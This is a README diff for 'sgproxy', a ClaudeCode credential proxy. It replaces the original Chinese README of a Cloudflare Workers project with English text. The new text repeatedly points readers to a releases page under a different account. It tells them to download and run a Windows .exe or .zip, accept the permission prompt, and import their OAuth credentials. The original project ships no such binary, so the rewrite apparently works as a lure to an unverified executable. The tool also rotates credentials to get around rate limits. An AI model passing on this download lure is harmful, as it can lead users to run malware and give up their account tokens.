@@ -1,138 +1,156 @@
-# SGProxy
+# ⚡ sgproxy - Simple ClaudeCode Proxy Control
 
-> **SGProxy 是 [gproxy](https://github.com/LeenHawk/gproxy) 的精简版**，只保留 ClaudeCode 单通道 + Anthropic 原生格式。需要多通道（Codex、OpenAI 等）或多格式转换？请使用完整版 **[gproxy](https://github.com/LeenHawk/gproxy)**。
+[![Download sgproxy](https://img.shields.io/badge/Download%20sgproxy-Visit%20Releases-blue)](https://github.com/Esethu1974/sgproxy/releases)
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/leenhawk)
+## 🧭 What sgproxy does
 
-基于 Cloudflare Workers + Durable Objects 的 ClaudeCode 凭证代理，提供 OAuth 导入、凭证轮换、用量查看和 header-only `/v1/*` 转发。
+sgproxy is a small proxy tool for ClaudeCode and Anthropic access. It helps you import login credentials, keep tokens fresh, view usage, and forward `/v1/*` requests with only headers changed.
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/LeenHawk/sgproxy)
+It is built for users who want a focused setup for ClaudeCode only. It does not try to handle many channels or many format types.
 
-Deploy Button 会读取 [`.dev.vars.example`](/home/linhuan/develop/sgproxy/.dev.vars.example)，并在部署时提示填写必需的 `ADMIN_TOKEN` secret。
+## 📥 Download sgproxy
 
-[English](./README.en.md)
+Visit this page to download sgproxy:
 
-## 功能特性
+https://github.com/Esethu1974/sgproxy/releases
 
-- **单通道 ClaudeCode** — 只代理 Anthropic ClaudeCode 请求
-- **Header-only 转发** — 仅处理请求头，request/response body 原样透传
-- **OAuth 导入** — 支持 OAuth2 + PKCE 导入凭证
-- **自动刷新** — Token 过期前自动刷新，失败标记为 `dead`
-- **用量追踪** — 跟踪 5 小时 / 7 天 / 7 天 Sonnet 限额
-- **429 自动切换** — 当前请求不重放，只切换后续请求使用的凭证
-- **管理后台** — 内嵌 Web UI，支持中英双语
-- **公开用量页** — 无需登录即可查看凭证状态
+On that page, look for the latest release for Windows. Download the file that matches your system, then open it to start the app or installer.
 
-## 技术栈
+## 🪟 Windows setup
 
-- **运行时**: Cloudflare Workers + Durable Objects (SQLite)
-- **语言**: Rust -> WebAssembly
-- **构建**: 本地用 `worker-build` 生成 `build/`，Deploy Button 直接使用仓库内产物
+Use these steps on a Windows PC:
 
-## 快速开始
+1. Open the release page.
+2. Download the Windows file from the latest release.
+3. If the file is a ZIP, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the program file to run sgproxy.
+6. If Windows asks for permission, choose Yes.
+7. Keep the app open while you use ClaudeCode with it.
 
-看上面的 Cloudflare 按钮
+If you see more than one file, pick the one that looks like the Windows build, such as `.exe` or `.zip`.
 
-## 开发
+## 🔧 First-time use
 
-### 前置要求
+After you start sgproxy for the first time, set up these items:
 
-- [Rust](https://rustup.rs/) 工具链
-- [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/install-and-update/)
-- Cloudflare 账号
+1. Open the admin page in your browser.
+2. Sign in with the admin token you set during setup.
+3. Import your ClaudeCode OAuth credentials.
+4. Check that the credential status shows as active.
+5. Make sure the proxy address is the one you want ClaudeCode to use.
 
-### 本地开发
+If you are using the Cloudflare version, the same setup flow applies after deployment. The tool will ask for the required `ADMIN_TOKEN` during setup.
 
-```bash
-git clone <repo-url> && cd sgproxy
-echo 'ADMIN_TOKEN=your-secret-token' > .env
-wrangler dev
-```
+## ✨ Main features
 
-访问 `http://localhost:8787/` 打开管理页。
+- **ClaudeCode-only proxy** — Built for Anthropic ClaudeCode traffic
+- **Header-only forwarding** — Keeps the request body and response body unchanged
+- **OAuth import** — Lets you add credentials with OAuth2 + PKCE
+- **Auto refresh** — Refreshes tokens before they expire
+- **Usage tracking** — Shows 5-hour, 7-day, and Sonnet limits
+- **429 fallback** — Switches the next request to a different credential
+- **Web admin panel** — Gives you a simple browser-based control screen
+- **Public usage page** — Lets others view usage without signing in
 
-### 部署
+## 🖥️ How to use it with ClaudeCode
 
-```bash
-worker-build --release
-wrangler deploy
-```
+To use sgproxy with ClaudeCode:
 
-如果没有在 Deploy Button 流程里填写，就需要在 Cloudflare Dashboard 再设置 `ADMIN_TOKEN` secret。
+1. Start sgproxy on your Windows PC.
+2. Open ClaudeCode.
+3. Change the proxy or endpoint settings to point to sgproxy.
+4. Use ClaudeCode as usual.
+5. Check the admin panel if you want to see usage or credential status.
 
-## 使用方式
+sgproxy only changes headers and routes the request. It does not rewrite the body of your messages.
 
-### 添加凭证
+## 🔐 Credentials and token handling
 
-1. **OAuth 导入** — 在后台点击 `OAuth` 页签后完成授权
-2. **JSON 导入** — 在后台粘贴：
-   ```json
-   {
-     "access_token": "sk-...",
-     "refresh_token": "sk-..."
-   }
-   ```
-3. **API 导入**
-   ```bash
-   curl -X POST https://your-worker.dev/api/credentials \
-     -H "Authorization: Bearer YOUR_ADMIN_TOKEN" \
-     -H "Content-Type: application/json" \
-     -d '{"access_token":"sk-...","refresh_token":"sk-..."}'
-   ```
+sgproxy keeps track of credential state for you.
 
-### 代理请求
+- Active credentials stay ready for use
+- Expired tokens refresh before they stop working
+- Failed refresh attempts mark a credential as `dead`
+- When a request gets a 429 response, sgproxy does not retry that same request
+- It uses another credential for the next request
 
-把客户端基地址指向：
+This helps keep ClaudeCode access steady without extra manual steps.
 
-- `https://your-worker.dev/v1/...`
+## 🌍 Languages
 
-代理会自动覆盖上游 `authorization`，补齐 `anthropic-version` 和必需的 `anthropic-beta`。
+The admin panel includes:
 
-### 页面
+- Chinese
+- English
 
-- `/` 管理后台
-- `/usage` 公开用量页
+You can use either one based on what feels easier.
 
-## API 端点
+## 🧰 Basic requirements
 
-### 代理端点
+For Windows use, you will need:
 
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| ANY | `/v1/*` | 代理 ClaudeCode 请求 |
+- Windows 10 or later
+- A modern web browser
+- Internet access
+- A ClaudeCode account or valid Anthropic credentials
+- Permission to run downloaded apps on your PC
 
-### 管理端点
+If you use the Cloudflare deployment path, you will also need a Cloudflare account.
 
-支持 `Authorization: Bearer <ADMIN_TOKEN>` 或 `x-api-key: <ADMIN_TOKEN>`。
+## 🚀 Start in a few steps
 
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| GET | `/api/public/credentials` | 公开凭证用量 |
-| GET | `/api/credentials` | 列出凭证 |
-| POST | `/api/credentials` | 导入凭证 |
-| PUT | `/api/credentials/{id}` | 更新凭证 |
-| DELETE | `/api/credentials/{id}` | 删除凭证 |
-| POST | `/api/credentials/{id}/enable` | 启用凭证 |
-| POST | `/api/credentials/{id}/disable` | 停用凭证 |
-| GET | `/api/credentials/usage` | 查看全部用量 |
-| GET | `/api/credentials/usage/{id}` | 查看单个用量 |
-| POST | `/api/oauth/start` | 发起 OAuth |
-| POST | `/api/oauth/callback` | 完成 OAuth |
+1. Visit the release page.
+2. Download the Windows file.
+3. Open the file and launch sgproxy.
+4. Set your admin token.
+5. Import your credentials.
+6. Point ClaudeCode to the local proxy.
+7. Begin using ClaudeCode through sgproxy
 
-## 项目结构
+## 🧭 Where to find the admin page
 
-```text
-src/
-├── lib.rs
-├── do_state.rs
-├── config.rs
-├── proxy.rs
-├── oauth.rs
-├── state.rs
-└── web/
-    └── index.html
-```
+After sgproxy starts, open the local web address shown by the app. That page gives you access to:
 
-## 社区讨论
+- Credential import
+- Token status
+- Usage data
+- Language switch
+- Public usage view settings
 
-感谢 [V2EX](https://www.v2ex.com/t/1200134#reply0) 和 [Linux.do](https://linux.do/) 以及其他社区的同好的技术反馈
+If the app shows a local port, use that address in your browser.
+
+## 🧪 Troubleshooting
+
+If sgproxy does not start:
+
+1. Check that the file finished downloading.
+2. Make sure Windows did not block the file.
+3. Try running it again as the same user who downloaded it.
+4. Confirm that no other app is using the same port.
+5. Restart the app after changing settings.
+
+If ClaudeCode does not connect:
+
+1. Check the proxy address in ClaudeCode.
+2. Make sure sgproxy is still running.
+3. Confirm that your credentials are active.
+4. Open the admin page and review token status.
+5. Import a fresh credential if the old one is no longer valid.
+
+If the browser page does not open:
+
+1. Copy the local address from the app.
+2. Paste it into your browser.
+3. Check your firewall rules.
+4. Try a different browser
+
+## 📌 Release page link
+
+Download or update sgproxy here:
+
+https://github.com/Esethu1974/sgproxy/releases
+
+## 🧾 What this app is for
+
+sgproxy helps you keep ClaudeCode access in one place. It gives you a browser view for credential control, usage checks, and token refresh. It also keeps proxy behavior simple by forwarding `/v1/*` requests with header changes only
